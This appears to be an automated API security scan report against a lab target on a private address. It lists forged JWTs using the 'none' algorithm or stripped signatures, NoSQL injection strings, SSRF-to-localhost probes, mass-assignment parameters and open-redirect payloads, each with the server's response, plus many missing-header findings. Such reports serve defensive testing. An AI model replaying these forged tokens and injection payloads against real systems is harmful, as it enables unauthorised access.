# ZAP-Python Security Report

**Target:** http://192.168.0.128:8888
**Scanners:** Active IDOR Scanner, OS Command Injection, Missing Security Headers, Username Hash Disclosure (IDOR), SQL Injection, JWT Security Scanner, Mass Assignment Scanner, External Redirect Scanner, SSRF Scanner, XML External Entity (XXE)
**Total Findings:** 600

## Critical Severity Findings

### JWT None Algorithm
**Category:** API2:2023 Broken Authentication
**Exploitability:** High
**Description:** The server accepted a JWT signed with the 'none' algorithm.

**Affected Endpoints (7):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 2. POST /identity/api/auth/forget-password
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 3. GET /identity/api/v2/vehicle/vehicles
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 4. GET /workshop/api/management/users/all
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 5. GET /workshop/api/mechanic/
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 6. GET /workshop/api/mechanic/service_requests
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

#### 7. GET /workshop/api/shop/orders/all
```text
Token Used: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

---
### JWT Signature Exclusion
**Category:** API2:2023 Broken Authentication
**Exploitability:** High
**Description:** The server accepted a JWT with the signature removed.

**Affected Endpoints (1):**

#### 1. POST /community/api/v2/coupon/validate-coupon
```text
Token Used: eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ0ZXN0MUBnbWFpbC5jb20iLCJpYXQiOjE3NzA4NDUwMDYsImV4cCI6MTc3MTQ0OTgwNiwicm9sZSI6InVzZXIifQ.
Response Code: 200
```

---
### NoSQL Injection (Logic Bypass)
**Category:** API8:2023 Injection
**Exploitability:** High
**Description:** The endpoint returned HTTP 200 OK for a NoSQL logic bypass payload. This suggests it accepted the query.

**Affected Endpoints (4):**

#### 1. POST /identity/api/v2/user/change-email
```text
Param: body
Payload: {'coupon_code': 'test', 'amount': "'; return true; var foo='"}
Response Code: 200
```

#### 2. POST /identity/api/v2/user/change-email
```text
Param: body
Payload: {'content': 'test', 'title': "'; return true; var foo='"}
Response Code: 200
```

#### 3. GET /identity/api/v2/user/videos/convert_video
```text
Param: body
Payload: {'email': "'; return true; var foo='", 'password': 'test'}
Response Code: 200
```

#### 4. POST /workshop/api/merchant/contact_mechanic
```text
Param: body
Payload: {'email': 'test', 'password': "'; return true; var foo='"}
Response Code: 200
```

---
### SSRF - Internal Network Access
**Category:** API10:2023 Server Side Request Forgery (SSRF)
**Exploitability:** High
**Description:** The application returned a response indicating successful access to localhost:8888.

**Affected Endpoints (4):**

#### 1. POST /identity/api/v2/user/reset-password
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 2. GET /workshop/api/mechanic/service_requests
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

#### 3. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://localhost:8888
Status: 500
Content Matched: response_from_mechanic_api or 200 OK
```

#### 4. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://localhost:8888
Status: 200
Content Matched: response_from_mechanic_api or 200 OK
```

---
## High Severity Findings

### SSRF - Connection Attempt Failed
**Category:** API10:2023 Server Side Request Forgery (SSRF)
**Exploitability:** High
**Description:** The application revealed a connection error when trying to access an internal port, indicating it attempted the connection.

**Affected Endpoints (1):**

#### 1. POST /workshop/api/merchant/contact_mechanic
```text
Payload: http://localhost:9999
Response content indicates connection failure (Blind SSRF): '{"message":"Could not connect to mechanic api."}'
```

---
## Medium Severity Findings

### Mass Assignment (Status Anomaly)
**Category:** API3:2023 Broken Object Property Level Authorization
**Exploitability:** Medium
**Description:** Injecting 'status' caused a status code change from 400 to 200. Investigate for logic bypass.

**Affected Endpoints (4):**

#### 1. POST /community/api/v2/community/posts
```text
Param: status
Baseline Status: 400
Attack Status: 200
```

#### 2. POST /community/api/v2/community/posts
```text
Param: credit
Baseline Status: 400
Attack Status: 200
```

#### 3. POST /community/api/v2/community/posts
```text
Param: isVerified
Baseline Status: 400
Attack Status: 200
```

#### 4. POST /community/api/v2/community/posts
```text
Param: confirmed
Baseline Status: 400
Attack Status: 200
```

---
### Open Redirect (Header)
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Medium
**Description:** The application redirects to an arbitrary external domain specified in the request parameter.

**Affected Endpoints (13):**

#### 1. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: URL='http://9e1c408a-692c-4708-a95d-59e827eefc4a.owasp.org'
Location Header: /community/api/v2/community/posts/URL=%27http:/9e1c408a-692c-4708-a95d-59e827eefc4a.owasp.org%27
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Param: postId
Payload: 5;URL='https://9e1c408a-692c-4708-a95d-59e827eefc4a.owasp.org/?foo'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/9e1c408a-692c-4708-a95d-59e827eefc4a.owasp.org/?foo'
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: http://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org
Location Header: /community/api/v2/community/posts/http:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/comment
```

#### 4. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org
Location Header: /community/api/v2/community/posts/https:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/comment
```

#### 5. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: //1616604b-fec1-4e30-9e2b-93213db66574.owasp.org
Location Header: /community/api/v2/community/posts/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/comment
```

#### 6. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: HtTpS://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org
Location Header: /community/api/v2/community/posts/HtTpS:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/comment
```

#### 7. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: HtTp://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org
Location Header: /community/api/v2/community/posts/HtTp:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/comment
```

#### 8. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/?foo
Location Header: /community/api/v2/community/posts/https:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/?foo/comment
```

#### 9. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: https://\1616604b-fec1-4e30-9e2b-93213db66574.owasp.org
Location Header: /community/api/v2/community/posts/https:/%5C1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/comment
```

#### 10. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: http://\1616604b-fec1-4e30-9e2b-93213db66574.owasp.org
Location Header: /community/api/v2/community/posts/http:/%5C1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/comment
```

#### 11. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: 5;URL='https://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org%27/comment
```

#### 12. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: URL='http://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org'
Location Header: /community/api/v2/community/posts/URL=%27http:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org%27/comment
```

#### 13. POST /community/api/v2/community/posts/{postId}/comment
```text
Param: postId
Payload: 5;URL='https://1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/?foo'
Location Header: /community/api/v2/community/posts/5;URL=%27https:/1616604b-fec1-4e30-9e2b-93213db66574.owasp.org/?foo'/comment
```

---
## Low Severity Findings

### Missing Content-Security-Policy Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the Content-Security-Policy security header.

**Affected Endpoints (23):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. POST /identity/api/auth/v2/check-otp
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 5. POST /identity/api/auth/v3/check-otp
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 6. POST /identity/api/auth/v4.0/user/login-with-token
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 7. GET /identity/api/v2/user/videos/convert_video
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 8. DELETE /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 9. GET /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 10. PUT /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 11. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 12. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 13. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 14. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Content-Disposition', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 15. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 16. GET /workshop/api/management/users/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 17. GET /workshop/api/mechanic/mechanic_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 18. GET /workshop/api/mechanic/receive_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 19. GET /workshop/api/mechanic/service_requests
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 20. GET /workshop/api/shop/orders/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 21. POST /workshop/api/shop/orders/return_order
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 22. GET /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 23. PUT /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

---
### Missing Strict-Transport-Security Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the Strict-Transport-Security security header.

**Affected Endpoints (23):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. POST /identity/api/auth/v2/check-otp
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 5. POST /identity/api/auth/v3/check-otp
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 6. POST /identity/api/auth/v4.0/user/login-with-token
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 7. GET /identity/api/v2/user/videos/convert_video
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 8. DELETE /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 9. GET /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 10. PUT /identity/api/v2/user/videos/{video_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 11. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 12. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 13. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Content-Type-Options', 'X-XSS-Protection', 'Cache-Control', 'Pragma', 'Expires', 'X-Frame-Options']
```

#### 14. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Content-Length', 'Connection', 'Content-Disposition', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 15. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 16. GET /workshop/api/management/users/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 17. GET /workshop/api/mechanic/mechanic_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 18. GET /workshop/api/mechanic/receive_report
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 19. GET /workshop/api/mechanic/service_requests
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 20. GET /workshop/api/shop/orders/all
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Allow', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 21. POST /workshop/api/shop/orders/return_order
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 22. GET /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

#### 23. PUT /workshop/api/shop/orders/{order_id}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Vary', 'X-Frame-Options', 'X-Content-Type-Options', 'Referrer-Policy', 'Cross-Origin-Opener-Policy']
```

---
### Missing X-Content-Type-Options Header
**Category:** API7:2023 Security Misconfiguration
**Exploitability:** Low
**Description:** The response is missing the X-Content-Type-Options security header.

**Affected Endpoints (4):**

#### 1. GET /community/api/v2/community/posts/recent
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 2. GET /community/api/v2/community/posts/{postId}
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 3. POST /community/api/v2/community/posts/{postId}/comment
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

#### 4. POST /identity/api/v2/vehicle/resend_email
```text
Headers received: ['Server', 'Date', 'Content-Type', 'Transfer-Encoding', 'Connection', 'Access-Control-Allow-Headers', 'Access-Control-Allow-Methods', 'Access-Control-Allow-Origin']
```

---
